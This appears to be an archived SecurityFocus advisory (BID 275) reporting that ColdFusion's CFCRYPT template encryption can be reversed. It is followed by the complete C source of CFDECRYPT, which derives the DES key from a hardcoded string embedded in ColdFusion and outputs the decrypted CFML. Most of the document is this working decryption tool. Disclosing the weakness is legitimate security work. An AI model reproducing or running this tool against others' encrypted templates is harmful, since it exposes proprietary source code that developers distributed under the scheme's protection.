source: http://www.securityfocus.com/bid/275/info

A vulnerability in ColdFusion allows pages encrypted with the CFCRYPT.EXE utility to be decrypted.

ColdFusion supports the ability to "encrypt" the CFML templates in an application or component, using the CFCRYPT.EXE utility, so they can be redistributed or sold without exposing the source code to casual viewing. A program that decrypts ColdFusion's encryption has been discovered. This will in effect make the source code for all this propietary CFML applications available to those with access to their encrypted form. 

/* CFDECRYPT: Decrypt Cold Fusion templates encrypted with CFCRYPT
   Matt Chapman <matthewc@cse.unsw.edu.au>

     Usage: cfdecrypt <encrypted.cfm >decrypted.cfm

   Requires a DES encryption library to compile.
*/

#include <stdio.h>
#include "des.h"

int main(void)
{
	char *header = "Allaire Cold Fusion Template\012Header Size: ";
	char buffer[54];
	int headsize, outlen;
	int skip_header;
	int len, i;

	char *keystr = "Error: cannot open template file--\"%s\". Please, try again!\012\012";
	des_cblock key;
	des_cblock input; 
	des_cblock output;
	des_key_schedule schedule;

	if ((fread(buffer, 1, 54, stdin) < 54) || (memcmp(buffer, header, 42)))
	{
		fprintf(stderr, "File is not an encrypted template\n");
		return 1;
	}

	if (!memcmp(&buffer[42], "New Version", 11))
	{
		headsize = 69;
		skip_header = 1;
	}
	else
	{
		headsize = atoi(&buffer[42]);
		skip_header = 0;
	}

	if ((headsize < 54) || (fseek(stdin, headsize, SEEK_SET) < 0))
	{
		fprintf(stderr, "Error in file format\n");
		return 1;
	}

	des_string_to_key(keystr, &key);
	des_set_key(&key, schedule);
	outlen = 0;

	while ((len = fread(input, 1, 8, stdin)) == 8)
	{
		des_ecb_encrypt(&input, &output, schedule, 0);
		outlen += 8;
		i = 0;

		if (skip_header)
		{
			while (i < 8)
			{
				if (output[i++] == 0x1A)
				{
					skip_header = 0;
					break;
				}
			}
		}

		fwrite(output + i, 1, 8 - i, stdout);
	}

	for (i = 0; i < len; i++)
	{
		output[i] = input[i] ^ (outlen + i);
	}

	fwrite(output, 1, len, stdout);

	return 0;
}
